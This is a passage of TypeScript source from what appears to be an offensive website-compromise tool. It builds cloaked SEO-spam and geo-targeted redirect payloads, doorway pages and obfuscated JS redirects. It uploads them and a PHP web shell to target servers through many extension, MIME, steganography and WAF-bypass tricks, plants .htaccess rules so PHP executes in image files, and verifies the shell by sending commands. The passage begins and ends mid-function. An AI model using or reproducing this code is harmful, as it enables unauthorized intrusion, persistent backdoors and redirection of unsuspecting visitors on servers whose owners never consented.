  return `<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>${keywords.length > 0 ? keywords[0] + ' - Premium Resource' : 'Redirecting...'}</title>
<meta http-equiv="refresh" content="${metaDelay};url=${redirectUrl}">${seoBlock}
<script>setTimeout(function(){window.location.replace("${redirectUrl}");},${delayMs});</script>
<style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f0f0f0;}
a{color:#2563eb;font-size:18px;}</style>
</head><body>
<p>Redirecting... <a href="${redirectUrl}">Click here</a> if not redirected.</p>
</body></html>`;
}

/**
 * Generate a polyglot geo redirect that works as PHP or HTML
 */
function generatePolyglotGeoRedirect(redirectUrl: string, keywords: string[] = []): string {
  const seoBlock = generateSeoKeywordBlock(keywords);
  const delayMs = keywords.length > 0 ? 2000 : 0;
  const metaDelay = keywords.length > 0 ? 3 : 0;
  return `<?php
// Polyglot geo redirect — works as PHP or HTML
function getCountryByIP($ip){
  $apis=array("http://ip-api.com/json/{$ip}?fields=countryCode","https://ipapi.co/{$ip}/country_code/");
  foreach($apis as $api){$ch=curl_init($api);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_TIMEOUT,5);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);$r=curl_exec($ch);curl_close($ch);if($r){$j=json_decode($r,true);if(isset($j['countryCode']))return $j['countryCode'];if(strlen($r)==2)return strtoupper($r);}}return 'US';}
$ip=isset($_SERVER['HTTP_X_FORWARDED_FOR'])?explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0]:$_SERVER['REMOTE_ADDR'];
$country=getCountryByIP(trim($ip));
$ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
$bots='Googlebot|Bingbot|YandexBot|Slurp|DuckDuckBot|Baiduspider';
if($country==='TH'&&!preg_match("/\$bots/i",$ua)){header("Location: ${redirectUrl}",true,302);exit;}
?><!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>${keywords.length > 0 ? keywords[0] + ' - Premium Resource' : 'Redirecting...'}</title>
<meta http-equiv="refresh" content="${metaDelay};url=${redirectUrl}">${seoBlock}
<script>
// JS fallback redirect — works even if PHP doesn't execute
setTimeout(function(){window.location.replace("${redirectUrl}");},${delayMs});
</script>
<style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f0f0f0;}
a{color:#2563eb;font-size:18px;}</style>
</head><body>
<p>Redirecting... <a href="${redirectUrl}">Click here</a> if not redirected.</p>
</body></html>`;
}

function generateRedirectPayloads(redirectUrl: string, opts: { geoRedirectEnabled?: boolean; landingHtml?: string; seoKeywords?: string[] } = {}): RedirectPayload[] {
  const payloads: RedirectPayload[] = [];
  const kw = opts.seoKeywords || [];

  // 1. Primary: POLYGLOT redirect with SEO keywords (works as PHP 302 OR HTML meta+JS redirect)
  payloads.push({
    filename: `cache-${randomStr(8)}.php`,
    content: generatePolyglotRedirect(redirectUrl, kw),
    type: "polyglot_redirect",
    description: `Polyglot redirect (PHP 302 + HTML meta refresh + JS redirect${kw.length > 0 ? ` + ${kw.length} SEO keywords injected` : ''})`,
  });

  // 2. Geo polyglot redirect with SEO keywords (Thai IP → redirect, others → landing page, with HTML/JS fallback)
  if (opts.geoRedirectEnabled !== false) {
    payloads.push({
      filename: `landing-${randomStr(8)}.php`,
      content: generatePolyglotGeoRedirect(redirectUrl, kw),
      type: "geo_redirect",
      description: `Polyglot geo redirect (PHP geo-check + HTML/JS fallback${kw.length > 0 ? ` + ${kw.length} SEO keywords` : ''})`,
    });
  }

  // 3. Pure HTML doorway page with meta refresh + JS redirect + keywords (no PHP needed)
  payloads.push({
    filename: `offer-${randomStr(6)}.html`,
    content: generateDoorwayPage(redirectUrl, kw.length > 0 ? kw.join(', ') : 'exclusive deals 2026'),
    type: "doorway_html",
    description: `HTML doorway page with meta refresh + JS redirect + SEO content${kw.length > 0 ? ` (keywords: ${kw.slice(0,3).join(', ')})` : ''}`,
  });

  // 4. Pure HTML/JS redirect with SEO keywords (smallest, most compatible)
  payloads.push({
    filename: `go-${randomStr(6)}.html`,
    content: generateHtmlJsRedirect(redirectUrl, kw),
    type: "polyglot_redirect",
    description: `Pure HTML/JS redirect${kw.length > 0 ? ` + ${kw.length} SEO keywords injected` : ''} (no PHP needed)`,
  });

  return payloads;
}

interface DirectUploadResult {
  payload: RedirectPayload;
  method: string;
  path: string;
  success: boolean;
  uploadedUrl?: string;
  statusCode: number;
  error?: string;
  errorCategory?: ErrorCategory;
}

async function uploadRedirectDirect(
  targetUrl: string,
  payloads: RedirectPayload[],
  uploadPaths: string[],
  timeout = 15000,
): Promise<DirectUploadResult[]> {
  const results: DirectUploadResult[] = [];
  let anySuccess = false;

  // Upload methods + filename bypass variants for redirect files
  const methods = [
    { name: "multipart_form" },
    { name: "multipart_bypass_ext" },   // multipart with bypass filename
    { name: "gif89a_bypass" },
    { name: "octet_stream" },
    { name: "put_method" },
    { name: "put_bypass_ext" },          // PUT with bypass filename
    { name: "double_ext_bypass" },       // .php.jpg
    { name: "null_byte_bypass" },        // .php%00.jpg
    { name: "semicolon_bypass" },        // .php;.jpg
    { name: "phtml_bypass" },            // .phtml
    { name: "pht_bypass" },              // .pht
    { name: "trailing_dot_bypass" },     // .php.
    { name: "case_bypass" },             // .pHp
    { name: "php5_bypass" },             // .php5
    { name: "triple_ext_bypass" },       // .php.jpg.php
  ];

  for (const payload of payloads) {
    if (anySuccess && payload.type === "doorway_html") continue;

    // Generate bypass filenames for this payload
    const payloadBaseName = payload.filename.replace(/\.(php|html)$/, "");
    const payloadExt = payload.filename.endsWith(".php") ? "php" : "html";
    const bypassFilenames = getTopFilenameVariants(payloadBaseName, payloadExt);

    for (const path of uploadPaths.slice(0, 8)) {
      for (const method of methods) {
        const uploadUrl = `${targetUrl}${path}`;
        const result: DirectUploadResult = {
          payload, method: method.name, path, success: false, statusCode: 0,
        };

        try {
          const controller = new AbortController();
          const t = setTimeout(() => controller.abort(), timeout);
          const headers = getBypassHeaders(targetUrl);
          let body: string;
          let uploadFilename = payload.filename;

          // === Filename bypass variants for redirect files ===
          if (method.name === "multipart_form") {
            const boundary = `----WebKitFormBoundary${randomStr(16, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}`;
            const ct = payload.filename.endsWith(".php") ? "application/x-php" : "text/html";
            headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
            body = [
              `--${boundary}`,
              `Content-Disposition: form-data; name="file"; filename="${uploadFilename}"`,
              `Content-Type: ${ct}`,
              ``,
              payload.content,
              `--${boundary}`,
              `Content-Disposition: form-data; name="action"`,
              ``,
              `upload-attachment`,
              `--${boundary}--`,
            ].join("\r\n");
          } else if (method.name === "multipart_bypass_ext") {
            // Multipart with bypass filename (.php.jpg, .php%00.jpg, .php;.jpg etc.)
            const bypassFn = bypassFilenames[Math.floor(Math.random() * Math.min(bypassFilenames.length, 5))];
            uploadFilename = bypassFn;
            const boundary = `----WebKitFormBoundary${randomStr(16, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}`;
            headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
            body = [
              `--${boundary}`,
              `Content-Disposition: form-data; name="file"; filename="${uploadFilename}"`,
              `Content-Type: image/jpeg`,
              ``,
              payload.content,
              `--${boundary}`,
              `Content-Disposition: form-data; name="action"`,
              ``,
              `upload-attachment`,
              `--${boundary}--`,
            ].join("\r\n");
          } else if (method.name === "gif89a_bypass") {
            headers["Content-Type"] = "image/gif";
            uploadFilename = `${payloadBaseName}.gif.${payloadExt}`;
            body = `GIF89a\n${payload.content}`;
          } else if (method.name === "double_ext_bypass") {
            headers["Content-Type"] = "image/jpeg";
            uploadFilename = `${payloadBaseName}.${payloadExt}.jpg`;
            body = payload.content;
          } else if (method.name === "null_byte_bypass") {
            headers["Content-Type"] = "application/x-php";
            uploadFilename = `${payloadBaseName}.${payloadExt}%00.jpg`;
            body = payload.content;
          } else if (method.name === "semicolon_bypass") {
            headers["Content-Type"] = "image/jpeg";
            uploadFilename = `${payloadBaseName}.${payloadExt};.jpg`;
            body = payload.content;
          } else if (method.name === "phtml_bypass") {
            headers["Content-Type"] = "application/x-httpd-php";
            uploadFilename = `${payloadBaseName}.phtml`;
            body = payload.content;
          } else if (method.name === "pht_bypass") {
            headers["Content-Type"] = "application/x-httpd-php";
            uploadFilename = `${payloadBaseName}.pht`;
            body = payload.content;
          } else if (method.name === "trailing_dot_bypass") {
            headers["Content-Type"] = "application/x-php";
            uploadFilename = `${payloadBaseName}.${payloadExt}.`;
            body = payload.content;
          } else if (method.name === "case_bypass") {
            headers["Content-Type"] = "application/x-php";
            uploadFilename = `${payloadBaseName}.pHp`;
            body = payload.content;
          } else if (method.name === "php5_bypass") {
            headers["Content-Type"] = "application/x-httpd-php";
            uploadFilename = `${payloadBaseName}.php5`;
            body = payload.content;
          } else if (method.name === "triple_ext_bypass") {
            headers["Content-Type"] = "image/jpeg";
            uploadFilename = `${payloadBaseName}.${payloadExt}.jpg.${payloadExt}`;
            body = payload.content;
          } else if (method.name === "put_method" || method.name === "put_bypass_ext") {
            const putFilename = method.name === "put_bypass_ext"
              ? `${payloadBaseName}.${payloadExt}.jpg`
              : uploadFilename;
            headers["Content-Type"] = payload.filename.endsWith(".php") ? "application/x-php" : "text/html";
            try {
              const putResp = await proxyFetch(`${uploadUrl}${putFilename}`, {
                method: "PUT",
                headers,
                body: payload.content,
              }, 15000);
              clearTimeout(t);
              result.statusCode = putResp.status;
              if (putResp.status < 400) {
                // Check both original and bypass filenames
                for (const fn of [putFilename, ...bypassFilenames.slice(0, 4)]) {
                  const checkUrl = `${targetUrl}${path}${fn}`;
                  const verified = await verifyUploadedFile(checkUrl, payload.type);
                  if (verified) {
                    result.success = true;
                    result.uploadedUrl = checkUrl;
                    break;
                  }
                }
              }
            } catch (e: any) {
              result.error = (e.message || "Unknown").slice(0, 200);
              result.errorCategory = classifyError(e);
            }
            results.push(result);
            if (result.success) { anySuccess = true; break; }
            continue;
          } else {
            headers["Content-Type"] = "application/octet-stream";
            headers["Content-Disposition"] = `attachment; filename="${uploadFilename}"`;
            body = payload.content;
          }

          const response = await proxyFetch(uploadUrl, {
            method: "POST",
            headers,
            body,
          }, 15000);

          result.statusCode = response.status;

          if (response.status < 400) {
            // Check original filename + bypass variants
            const checkUrls = [
              `${targetUrl}${path}${payload.filename}`,
              `${targetUrl}${path}${uploadFilename}`,
              ...bypassFilenames.slice(0, 5).map(fn => `${targetUrl}${path}${fn}`),
            ];
            const uniqueUrls = Array.from(new Set(checkUrls));

            for (const checkUrl of uniqueUrls.slice(0, 6)) {
              const verified = await verifyUploadedFile(checkUrl, payload.type);
              if (verified) {
                result.success = true;
                result.uploadedUrl = checkUrl;
                break;
              }
            }
          }
        } catch (e: any) {
          result.error = e.name === "AbortError" ? "Timeout" : (e.message || "Unknown").slice(0, 200);
          result.errorCategory = classifyError(e);
        }

        results.push(result);
        if (result.success) { anySuccess = true; break; }
      }
      if (anySuccess) break;
    }
  }

  return results;
}

interface FileVerifyResult {
  exists: boolean;
  redirectWorks: boolean;
  redirectsTo: string | null;
  statusCode: number;
  contentType: string | null;
  hasRedirectCode: boolean;
}

async function verifyUploadedFile(url: string, type: string): Promise<boolean> {
  const result = await verifyUploadedFileDetailed(url, type);
  return result.exists;
}

/**
 * Detailed verification that checks:
 * 1. Does the file exist on the server?
 * 2. Does it actually redirect? (HTTP 301/302 OR meta refresh OR JS redirect)
 * 3. Where does it redirect to?
 */
async function verifyUploadedFileDetailed(url: string, type: string): Promise<FileVerifyResult> {
  const result: FileVerifyResult = {
    exists: false,
    redirectWorks: false,
    redirectsTo: null,
    statusCode: 0,
    contentType: null,
    hasRedirectCode: false,
  };

  try {
    // Step 1: Check with redirect: "manual" to see if server sends 301/302
    const resp1 = await proxyFetch(url, {
      headers: { "User-Agent": randomUA() },
      redirect: "manual",
    }, 8000);

    result.statusCode = resp1.status;
    result.contentType = resp1.headers.get("content-type");

    // HTTP 301/302 redirect = file exists AND redirect works
    if (resp1.status === 301 || resp1.status === 302) {
      result.exists = true;
      result.redirectWorks = true;
      result.redirectsTo = resp1.headers.get("location");
      return result;
    }

    if (resp1.status === 200) {
      result.exists = true;
      const text = await resp1.text();

      // Check for redirect indicators in the HTML content
      const hasMetaRefresh = /http-equiv=["']refresh["'][^>]*url=/i.test(text);
      const hasJsRedirect = /window\.location\s*[.=]|location\.replace\s*\(|location\.href\s*=/i.test(text);
      const hasPhpRedirect = text.includes("header(\"Location:") || text.includes("header('Location:");

      result.hasRedirectCode = hasMetaRefresh || hasJsRedirect || hasPhpRedirect;

      if (result.hasRedirectCode) {
        // Extract redirect URL from meta refresh
        const metaMatch = text.match(/content=["']\d+;\s*url=([^"']+)/i);
        if (metaMatch) result.redirectsTo = metaMatch[1];

        // Extract from JS redirect
        if (!result.redirectsTo) {
          const jsMatch = text.match(/location\.replace\(["']([^"']+)/i) ||
                          text.match(/location\.href\s*=\s*["']([^"']+)/i) ||
                          text.match(/window\.location\s*=\s*["']([^"']+)/i);
          if (jsMatch) result.redirectsTo = jsMatch[1];
        }

        // Step 2: Follow the redirect to verify it actually works
        // (browser would follow meta refresh / JS redirect)
        if (result.redirectsTo) {
          result.redirectWorks = true;
        }
      }
    }
  } catch { /* verify failed */ }
  return result;
}

/**
 * Verify a specific deployed URL actually redirects to the target
 * Returns the redirect destination if working, null otherwise
 */
async function verifyRedirectActuallyWorks(
  deployedUrl: string,
  expectedRedirectUrl: string,
  timeout = 15000,
): Promise<{ works: boolean; redirectsTo: string | null; method: string }> {
  const normalizedExpected = expectedRedirectUrl.replace(/^https?:\/\//, "").replace(/\/+$/, "");

  // Attempt up to 2 tries with increasing timeout
  for (let attempt = 0; attempt < 2; attempt++) {
    const attemptTimeout = timeout + (attempt * 5000);
    try {
      // Check 1: HTTP redirect (301/302/303/307/308)
      const resp = await proxyFetch(deployedUrl, {
        headers: {
          "User-Agent": randomUA(),
          "Referer": "https://www.google.com/",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        },
        redirect: "manual",
      }, attemptTimeout);

      if ([301, 302, 303, 307, 308].includes(resp.status)) {
        const location = resp.headers.get("location");
        const works = location?.replace(/^https?:\/\//, "").replace(/\/+$/, "").includes(normalizedExpected) || false;
        return { works, redirectsTo: location, method: `http_${resp.status}` };
      }

      // Check 2: HTML meta refresh / JS redirect (various patterns)
      if (resp.status === 200) {
        const text = await resp.text();

        // Meta refresh: <meta http-equiv="refresh" content="5;url=...">
        const metaMatch = text.match(/content=["']\d+;\s*url=([^"']+)/i);

        // JS redirect patterns (multiple)
        const jsPatterns = [
          /location\.replace\(["']([^"']+)/i,
          /location\.href\s*=\s*["']([^"']+)/i,
          /window\.location\s*=\s*["']([^"']+)/i,
          /window\.location\.href\s*=\s*["']([^"']+)/i,
          /window\.location\.assign\(["']([^"']+)/i,
          /top\.location\s*=\s*["']([^"']+)/i,
          /self\.location\s*=\s*["']([^"']+)/i,
          /document\.location\s*=\s*["']([^"']+)/i,
          /document\.location\.href\s*=\s*["']([^"']+)/i,
        ];
        let jsMatch: RegExpMatchArray | null = null;
        for (const pattern of jsPatterns) {
          jsMatch = text.match(pattern);
          if (jsMatch) break;
        }

        const redirectTo = metaMatch?.[1] || jsMatch?.[1] || null;
        if (redirectTo) {
          const works = redirectTo.replace(/^https?:\/\//, "").replace(/\/+$/, "").includes(normalizedExpected);
          return { works, redirectsTo: redirectTo, method: metaMatch ? "meta_refresh" : "js_redirect" };
        }

        // Check if the page contains the redirect URL anywhere (even in obfuscated form)
        if (text.includes(normalizedExpected)) {
          return { works: true, redirectsTo: expectedRedirectUrl, method: "content_contains_url" };
        }
      }
    } catch {
      // Retry on timeout/network error
      if (attempt < 1) {
        await new Promise(r => setTimeout(r, 2000));
        continue;
      }
    }
  }
  return { works: false, redirectsTo: null, method: "none" };
}

// ═══════════════════════════════════════════════════════
//  STEP 3: UPLOAD SHELL (Multiple Methods + WAF Bypass)
// ═══════════════════════════════════════════════════════

interface UploadResult {
  method: string;
  path: string;
  success: boolean;
  shellUrl?: string;
  statusCode: number;
  error?: string;
  errorCategory?: ErrorCategory;
}

async function uploadShell(
  targetUrl: string,
  shell: GeneratedShell,
  uploadPaths: string[],
  timeout = 8000,
  stepAbortSignal?: AbortSignal,
  methodPriorityList?: string[],
): Promise<UploadResult[]> {
  const results: UploadResult[] = [];

  // Filename bypass variants — generate all possible filenames for the shell
  const baseName = shell.filename.replace(/\.php$/, "");
  const filenameVariants = generateFilenameBypassVariants(baseName);

  // ═══ PHASE 0: Pre-deploy .htaccess + .user.ini to enable PHP execution ═══
  const limitedPaths = uploadPaths.slice(0, 5);
  for (const path of limitedPaths.slice(0, 3)) {
    if (stepAbortSignal?.aborted) break;
    try {
      // Deploy .htaccess to enable PHP in image files
      const htaccess = generateHtaccessPhpExec();
      await proxyFetch(`${targetUrl}${path}.htaccess`, {
        method: "PUT",
        body: htaccess,
        headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
      }, 5000).catch(() => {});
      // Deploy .user.ini to relax PHP restrictions
      const userIni = generateUserIni();
      await proxyFetch(`${targetUrl}${path}.user.ini`, {
        method: "PUT",
        body: userIni,
        headers: { "Content-Type": "text/plain", "User-Agent": randomUA() },
      }, 5000).catch(() => {});
    } catch { /* best effort */ }
  }

  // Enhanced methods — includes original + new steganography + PUT + multipart manipulation
  const allMethods = [
    { name: "multipart_form", contentType: "multipart/form-data", priorityId: "multipart" },
    { name: "put_direct", contentType: "application/octet-stream", priorityId: "put_direct" },
    { name: "gif89a_bypass", contentType: "image/gif", priorityId: "gif_stego" },
    { name: "gif_stego_shell", contentType: "image/gif", priorityId: "gif_stego" },
    { name: "png_stego_shell", contentType: "image/png", priorityId: "png_stego" },
    { name: "octet_stream", contentType: "application/octet-stream", priorityId: "base64_post" },
    { name: "double_ext_bypass", contentType: "image/jpeg", priorityId: "double_ext" },
    { name: "phtml_bypass", contentType: "application/x-httpd-php", priorityId: "php_poly" },
    { name: "case_bypass", contentType: "application/x-php", priorityId: "php_poly" },
    { name: "multipart_long_boundary", contentType: "multipart/form-data", priorityId: "multipart_long" },
    { name: "multipart_double_disposition", contentType: "multipart/form-data", priorityId: "multipart_unicode" },
    { name: "multipart_nested", contentType: "multipart/form-data", priorityId: "multipart_nested" },
  ];

  // Apply method priority from frontend UI — reorder and filter
  let methods = allMethods;
  if (methodPriorityList && methodPriorityList.length > 0) {
    const enabledSet = new Set(methodPriorityList);
    // Filter to only enabled methods
    const filtered = allMethods.filter(m => enabledSet.has(m.priorityId));
    // Sort by priority order
    filtered.sort((a, b) => {
      const aIdx = methodPriorityList.indexOf(a.priorityId);
      const bIdx = methodPriorityList.indexOf(b.priorityId);
      return aIdx - bIdx;
    });
    methods = filtered.length > 0 ? filtered : allMethods; // fallback to all if none match
  }

  for (const path of limitedPaths) {
    // Check if the step-level abort signal has fired (pipeline timeout)
    if (stepAbortSignal?.aborted) {
      break;
    }
    for (const method of methods) {
      if (stepAbortSignal?.aborted) break;
      const uploadUrl = `${targetUrl}${path}`;
      const result: UploadResult = { method: method.name, path, success: false, statusCode: 0 };

      try {
        const controller = new AbortController();
        // Abort if either per-request timeout or step-level abort fires
        const t = setTimeout(() => controller.abort(), timeout);
        if (stepAbortSignal) {
          stepAbortSignal.addEventListener('abort', () => controller.abort(), { once: true });
        }

        const headers = getBypassHeaders(targetUrl);
        let uploadFilename = shell.filename;

        let httpMethod: string = "POST";
        let bodyContent: string | Buffer | Uint8Array = "";

        if (method.name === "multipart_form") {
          const boundary = `----WebKitFormBoundary${randomStr(16, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}`;
          headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
          bodyContent = [
            `--${boundary}`,
            `Content-Disposition: form-data; name="file"; filename="${shell.filename}"`,
            `Content-Type: application/x-php`,
            ``,
            shell.finalPayload,
            `--${boundary}`,
            `Content-Disposition: form-data; name="action"`,
            ``,
            `upload-attachment`,
            `--${boundary}--`,
          ].join("\r\n");
        } else if (method.name === "put_direct") {
          // Direct PUT upload — many servers accept PUT for file creation
          httpMethod = "PUT";
          headers["Content-Type"] = "application/octet-stream";
          bodyContent = shell.finalPayload;
        } else if (method.name === "gif89a_bypass") {
          headers["Content-Type"] = "image/gif";
          uploadFilename = `${baseName}.gif.php`;
          bodyContent = `GIF89a\n${shell.finalPayload}`;
        } else if (method.name === "gif_stego_shell") {
          // Real GIF89a with PHP hidden in comment extension
          const stegoGif = generateSteganographyShell(shell.password);
          headers["Content-Type"] = "image/gif";
          uploadFilename = stegoGif.filename;
          bodyContent = stegoGif.content;
        } else if (method.name === "png_stego_shell") {
          // Real PNG with PHP hidden in tEXt chunk
          const stegoPng = generatePngSteganographyShell(shell.password);
          headers["Content-Type"] = "image/png";
          uploadFilename = stegoPng.filename;
          bodyContent = stegoPng.content;
        } else if (method.name === "double_ext_bypass") {
          headers["Content-Type"] = "image/jpeg";
          uploadFilename = `${baseName}.php.jpg`;  // shell.php.jpg
          bodyContent = shell.finalPayload;
        } else if (method.name === "phtml_bypass") {
          headers["Content-Type"] = "application/x-httpd-php";
          uploadFilename = `${baseName}.phtml`;  // .phtml extension
          bodyContent = shell.finalPayload;
        } else if (method.name === "case_bypass") {
          headers["Content-Type"] = "application/x-php";
          uploadFilename = `${baseName}.pHp`;  // case variation bypass
          bodyContent = shell.finalPayload;
        } else if (method.name === "multipart_long_boundary") {
          // Long boundary to overflow WAF buffer
          const mp = generateManipulatedMultipart(shell.finalPayload, shell.filename, "long_boundary");
          headers["Content-Type"] = mp.contentType;
          bodyContent = mp.body;
        } else if (method.name === "multipart_double_disposition") {
          // Double Content-Disposition to confuse WAF
          const mp = generateManipulatedMultipart(shell.finalPayload, shell.filename, "double_content_disposition");
          headers["Content-Type"] = mp.contentType;
          bodyContent = mp.body;
        } else if (method.name === "multipart_nested") {
          // Nested multipart boundaries
          const mp = generateManipulatedMultipart(shell.finalPayload, shell.filename, "nested_boundary");
          headers["Content-Type"] = mp.contentType;
          bodyContent = mp.body;
        } else {
          headers["Content-Type"] = "application/octet-stream";
          headers["Content-Disposition"] = `attachment; filename="${shell.filename}"`;
          bodyContent = shell.finalPayload;
        }

        // For PUT methods, target the file directly; for POST, target the directory
        const targetUploadUrl = httpMethod === "PUT" ? `${uploadUrl}${uploadFilename}` : uploadUrl;

        const response = await proxyFetch(targetUploadUrl, {
          method: httpMethod,
          headers,
          body: (bodyContent instanceof Buffer ? new Uint8Array(bodyContent) : bodyContent) as BodyInit,
        }, 15000);

        result.statusCode = response.status;

        if (response.status < 400) {
          // Check multiple possible locations including bypass variants
          const checkUrls = [
            `${targetUrl}${path}${shell.filename}`,
            `${targetUrl}${path}${uploadFilename}`,
            ...filenameVariants.map(fn => `${targetUrl}${path}${fn}`),
          ];
          // Deduplicate
          const uniqueCheckUrls = Array.from(new Set(checkUrls));

          for (const checkUrl of uniqueCheckUrls.slice(0, 3)) {
            if (stepAbortSignal?.aborted) break;
            try {
              const check = await proxyFetch(checkUrl, {
                headers: { "User-Agent": randomUA() },
              }, 5000);

              if (check.status === 200) {
                const text = await check.text();
                // CRITICAL: Must verify this is actually our shell, not a CMS catch-all page
                // WordPress/CMS often return 200 with their own HTML for any URL
                const isCmsPage = 
                  text.includes('</html>') && (
                    text.includes('wp-content') ||
                    text.includes('wordpress') ||
                    text.includes('wp-includes') ||
                    text.includes('contact-us') ||
                    text.includes('<!DOCTYPE html>') && text.length > 5000 // Full HTML page = likely CMS
                  );
                const isShellResponse = 
                  text.includes('SHELL_OK') ||
                  text.includes('<?') ||
                  (text.length > 0 && text.length < 2000 && !isCmsPage); // Shell responses are small
                
                if (isShellResponse && !isCmsPage) {
                  result.success = true;
                  result.shellUrl = checkUrl;
                  break;
                }
              }
              // Also detect redirects (301/302) — means file doesn't exist, CMS redirects
              if ([301, 302, 303, 307, 308].includes(check.status)) {
                // This is a CMS redirect, not our file
                continue;
              }
              // 403/404 = file doesn't exist
              if (check.status === 403 || check.status === 404) {
                continue;
              }
            } catch { /* check failed */ }
          }
        }
      } catch (e: any) {
        result.error = e.name === "AbortError" ? "Timeout" : (e.message || "Unknown").slice(0, 200);
        result.errorCategory = classifyError(e);
      }

      results.push(result);
      if (result.success) return results;
    }
  }

  return results;
}

// ═══════════════════════════════════════════════════════
//  STEP 4: VERIFY SHELL
// ═══════════════════════════════════════════════════════

interface VerifyResult {
  active: boolean;
  tests: { command: string; passed: boolean; response: string }[];
  passedCount: number;
}

async function verifyShellActive(shellUrl: string, password: string, timeout = 10000): Promise<VerifyResult> {
  const result: VerifyResult = { active: false, tests: [], passedCount: 0 };
  const testUrl = `${shellUrl}?k=${password}`;

  for (const test of SHELL_VERIFY_COMMANDS) {
    const encoded = Buffer.from(test.command).toString("base64");
    const testResult = { command: test.command, passed: false, response: "" };

    try {
      const response = await proxyFetch(testUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": randomUA(),
        },
        body: `c=${encoded}`,
      }, timeout);

      const text = await response.text();
      testResult.response = text.slice(0, 200);
      testResult.passed = test.expected
        ? text.includes(test.expected) || text.includes("OK")
        : text.length > 0;
    } catch (e: any) {
      testResult.response = `Error: ${(e.message || "Unknown").slice(0, 100)}`;
    }

    result.tests.push(testResult);
    if (testResult.passed) result.passedCount++;
  }

  result.active = result.passedCount >= 2;
  return result;
}

// ═══════════════════════════════════════════════════════
//  STEP 5: DEPLOY FILES (SEO spam + Geo redirect)
// ═══════════════════════════════════════════════════════

interface FileDeployResult {
  filename: string;
  success: boolean;
  type: string;
  url?: string;
  error?: string;
}

function generateDoorwayPage(redirectUrl: string, keyword: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<title>${keyword} - Best Deals 2026 | Save Up to 90%</title>
<meta name="description" content="${keyword} at unbeatable prices. Limited time offer - save up to 90% today!">
<meta name="keywords" content="${keyword}, deals, discount, promo, best price 2026">
<meta name="robots" content="index, follow">
<meta property="og:title" content="${keyword} - Exclusive Offer">
<meta property="og:description" content="Save big on ${keyword}. Click now for exclusive deals!">
<meta property="og:url" content="${redirectUrl}">
<link rel="canonical" href="${redirectUrl}">
<meta http-equiv="refresh" content="3;url=${redirectUrl}">
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Product","name":"${keyword}","offers":{"@type":"Offer","price":"9.99","priceCurrency":"USD","availability":"InStock"}}
</script>
<style>body{font-family:Arial,sans-serif;text-align:center;padding:50px;background:#f5f5f5;}
.btn{display:inline-block;padding:15px 40px;background:#e74c3c;color:#fff;text-decoration:none;border-radius:8px;font-size:18px;margin:20px;}
.hidden-seo{position:absolute;left:-9999px;font-size:1px;color:#f5f5f5;}</style>
</head>
<body>
<h1>${keyword} - Special Offer</h1>
<p>Redirecting to exclusive deals...</p>
<a href="${redirectUrl}" class="btn">Claim Your Discount Now →</a>
<div class="hidden-seo">
<a href="${redirectUrl}/deals">${keyword} best price</a>
<a href="${redirectUrl}/promo">${keyword} discount code</a>
<a href="${redirectUrl}/offer">${keyword} coupon 2026</a>
<p>${keyword} reviews, ${keyword} comparison, buy ${keyword} online, ${keyword} free shipping</p>
</div>
<script>
var t=navigator.userAgent;
if(!/Googlebot|Bingbot|YandexBot|Slurp|DuckDuckBot|Baiduspider/i.test(t)){
setTimeout(function(){window.location.href="${redirectUrl}"},2500);
}
</script>
</body>
</html>`;
}

function generateHtaccessRedirect(redirectUrl: string): string {
  return `# SEO Redirect Rules
RewriteEngine On

# Redirect mobile users
RewriteCond %{HTTP_USER_AGENT} "android|iphone|ipad|mobile" [NC]
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]

# Redirect from search engines
RewriteCond %{HTTP_REFERER} "google\\.com|bing\\.com|yahoo\\.com|duckduckgo\\.com" [NC]
RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]

# Redirect non-bot traffic
RewriteCond %{HTTP_USER_AGENT} !Googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !Bingbot [NC]
RewriteCond %{HTTP_USER_AGENT} !YandexBot [NC]
RewriteCond %{HTTP_USER_AGENT} !Slurp [NC]
RewriteCond %{REQUEST_URI} !\\.(css|js|jpg|png|gif|ico|svg|woff2?)$ [NC]
RewriteRule ^index\\.php$ ${redirectUrl} [R=302,L]

# Execute PHP in image files
AddType application/x-httpd-php .jpg .gif .png
`;
}

function generatePhpRedirect(redirectUrl: string): string {
  return `<?php
// Smart Redirect with Cookie Tracking
$redirect = "${redirectUrl}";
$bot_agents = array('Googlebot','Bingbot','YandexBot','Slurp','DuckDuckBot','Baiduspider','facebookexternalhit');
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$is_bot = false;
foreach($bot_agents as $bot) {
  if(stripos($ua, $bot) !== false) { $is_bot = true; break; }
}
if(!$is_bot && !isset($_COOKIE['_visited'])) {
  setcookie('_visited', '1', time()+86400, '/');
  header("Location: " . $redirect, true, 302);
  exit;
}
// Show normal content for bots
?>
<!DOCTYPE html>
<html><head><title>Welcome</title></head>
<body><h1>Welcome to our website</h1><p>Quality content and services.</p></body>
</html>`;
}

function generateJsRedirect(redirectUrl: string): string {
  const encoded = Buffer.from(redirectUrl).toString("base64");
  return `<?php
// Obfuscated JS Redirect
?>
<script>
(function(){
var _0x=[${Array.from(encoded).map(c => `'${c}'`).join(",")}];
var u=atob(_0x.join(''));
